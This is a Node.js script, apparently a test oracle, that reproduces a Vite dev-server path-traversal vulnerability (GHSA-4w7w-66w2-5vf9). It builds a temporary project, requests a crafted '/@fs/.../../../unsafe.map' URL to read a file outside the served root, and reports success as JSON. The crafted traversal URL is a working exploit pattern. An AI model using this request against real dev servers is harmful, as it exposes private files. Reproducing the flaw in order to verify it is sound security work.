const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  try {
    const vite = require('vite');

    const marker = 'vite-ghsa-4w7w-66w2-5vf9-' + process.pid + '-' + Date.now();
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'root');
    const srcDir = path.join(root, 'src');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    const outsideMap = path.join(base, 'unsafe.map');

    fs.mkdirSync(srcDir, { recursive: true });
    fs.mkdirSync(depsDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body><script type="module" src="/src/main.js"></script></body></html>');
    fs.writeFileSync(path.join(srcDir, 'main.js'), 'export const ok = 7; console.log(ok);');
    fs.writeFileSync(path.join(depsDir, 'dummy.js'), 'export const dummy = 1;');
    fs.writeFileSync(outsideMap, JSON.stringify({ version: 3, file: 'x.js', sources: [], names: [], mappings: '', exposed: marker }));

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'spa',
      server: { host: true, port: 0, fs: { strict: true } },
      optimizeDeps: { noDiscovery: true }
    });

    await server.listen();

    const benign = await server.transformRequest('/src/main.js');
    if (!benign || typeof benign.code !== 'string' || benign.code.indexOf('ok = 7') === -1) {
      throw new Error('benign transform failed');
    }

    operation_completed = true;

    const absDeps = depsDir.split(path.sep).join('/');
    const maliciousUrl = '/@fs/' + absDeps + '/../../../unsafe.map';

    let body = '';
    try {
      body = await server.transformRequest(maliciousUrl);
    } catch (e1) {
      try {
        body = await server.transformRequest(maliciousUrl + '?import');
      } catch (e2) {
        body = '';
      }
    }

    const text = typeof body === 'string' ? body : (body && typeof body.code === 'string' ? body.code : '');
    if (text.includes(marker)) {
      exploit_succeeded = true;
      evidence = 'served out-of-root .map marker via optimized-deps traversal path';
    } else {
      exploit_succeeded = false;
      evidence = 'out-of-root .map marker not exposed';
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failure: ' + (err && err.message ? err.message : String(err));
  } finally {
    if (server) {
      try {
        await server.close();
      } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();